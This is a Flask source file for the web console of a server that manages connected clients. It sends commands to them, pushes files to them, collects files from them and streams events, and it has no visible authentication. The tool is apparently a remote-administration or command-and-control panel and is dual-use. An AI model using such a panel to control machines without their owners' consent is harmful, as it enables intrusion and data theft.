import json
import os
import queue
from datetime import datetime

from flask import Flask, Response, jsonify, request, send_from_directory, stream_with_context


def create_app(server_instance):
    app = Flask(__name__, static_folder='../../static', static_url_path='')
    web_service = server_instance.web_service
    file_service = web_service.file_service

    # ------------------ response helpers ------------------ #
    def _ok(data=None, message='ok', code=0, http_status=200):
        payload = {
            'code': code,
            'message': message,
        }
        if data is not None:
            payload['data'] = data
        return jsonify(payload), http_status

    def _fail(message, http_status=400, code=1, **extra):
        payload = {
            'code': code,
            'message': str(message),
        }
        if extra:
            payload.update(extra)
        return jsonify(payload), http_status

    # ------------------ request helpers ------------------ #
    def _get_required_command():
        payload = request.get_json(silent=True) or {}
        command = (payload.get('command') or '').strip()
        if not command:
            raise ValueError('command is required')
        return command

    def _get_required_upload():
        upload = request.files.get('file')
        if not upload or not upload.filename:
            raise ValueError('file is required')
        return upload

    def _handle_common_file_error(error):
        if isinstance(error, ValueError):
            return _fail(str(error), 400)
        if isinstance(error, FileNotFoundError):
            return _fail('file not found', 404)
        return _fail(str(error), 500)

    # ------------------ pages ------------------ #
    @app.get('/')
    def index():
        return send_from_directory(app.static_folder, 'index.html')

    # ------------------ connections ------------------ #
    @app.get('/api/connections')
    def get_connections():
        return _ok(web_service.get_connections_payload())

    @app.post('/api/connections/<client_id>/command')
    def send_command(client_id):
        try:
            command = _get_required_command()
            result = web_service.submit_command(client_id, command)
            return _ok(result)
        except ValueError as e:
            return _fail(e, 400)
        except Exception as e:
            return _fail(e, 400)

    @app.post('/api/connections/<client_id>/kill')
    def kill_connection(client_id):
        try:
            server_instance.kill_connection_by_client_id(client_id)
            return _ok()
        except Exception as e:
            return _fail(e, 400)

    @app.post('/api/connections/<client_id>/upload')
    def upload_file_to_client(client_id):
        try:
            upload = _get_required_upload()
            temp_path, safe_name = file_service.create_upload_temp_file(upload)
            result = web_service.submit_upload(client_id, temp_path, safe_name)
            return _ok(result)
        except ValueError as e:
            return _fail(e, 400)
        except Exception as e:
            return _fail(e, 400)

    # ------------------ event stream ------------------ #
    @app.get('/api/stream')
    def stream():
        q = web_service.event_bus.subscribe()

        def event_stream():
            try:
                while True:
                    try:
                        item = q.get(timeout=15)
                        yield f"event: {item['event']}\n"
                        yield f"data: {json.dumps(item['data'], ensure_ascii=False)}\n\n"
                    except queue.Empty:
                        yield "event: ping\n"
                        yield f"data: {json.dumps({'time': datetime.now().isoformat()}, ensure_ascii=False)}\n\n"
            finally:
                web_service.event_bus.unsubscribe(q)

        return Response(
            stream_with_context(event_stream()),
            mimetype='text/event-stream',
            headers={
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'X-Accel-Buffering': 'no'
            }
        )

    # ------------------ received files ------------------ #
    @app.get('/api/files/recent')
    def get_recent_files():
        try:
            return _ok(file_service.list_received_files())
        except Exception as e:
            return _fail(e, 500)

    @app.get('/api/files/recent/<path:saved_name>')
    def download_recent_file(saved_name):
        file_path = file_service.get_received_file_download_path(saved_name)

        if not os.path.isfile(file_path):
            return _fail('file not found', 404)

        return send_from_directory(
            file_service.received_files_dir,
            saved_name,
            as_attachment=True,
            download_name=saved_name
        )

    @app.get('/api/files/recent/<path:saved_name>/raw')
    def get_recent_file_raw(saved_name):
        try:
            file_path = file_service.get_safe_received_file_path(saved_name)
            if not os.path.isfile(file_path):
                raise FileNotFoundError('file not found')

            directory = os.path.dirname(file_path)
            filename = os.path.basename(file_path)
            return send_from_directory(directory, filename, as_attachment=False)
        except Exception as e:
            return _handle_common_file_error(e)

    @app.get('/api/files/recent/<path:saved_name>/preview')
    def preview_recent_file(saved_name):
        try:
            payload = file_service.build_file_preview_payload(saved_name)
            return _ok(payload)
        except Exception as e:
            return _handle_common_file_error(e)

    @app.delete('/api/files/recent/<path:saved_name>')
    def delete_recent_file(saved_name):
        try:
            file_service.delete_received_file(saved_name)
            return _ok()
        except Exception as e:
            return _handle_common_file_error(e)

    # ------------------ http uploads ------------------ #
    app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50 MB

    @app.route('/api/files/upload', methods=['POST'])
    def upload_file():
        try:
            upload = _get_required_upload()
            category = request.form.get('category', '').strip()
            client_id = request.form.get('client_id', '').strip()

            result = file_service.save_http_uploaded_file(
                upload,
                category=category,
                client_id=client_id
            )
            return _ok(result)
        except ValueError as e:
            return _fail(e, 400)
        except Exception as e:
            return _fail(e, 500)

    @app.errorhandler(413)
    def file_too_large(_):
        return _fail('File is too large', 413)

    return app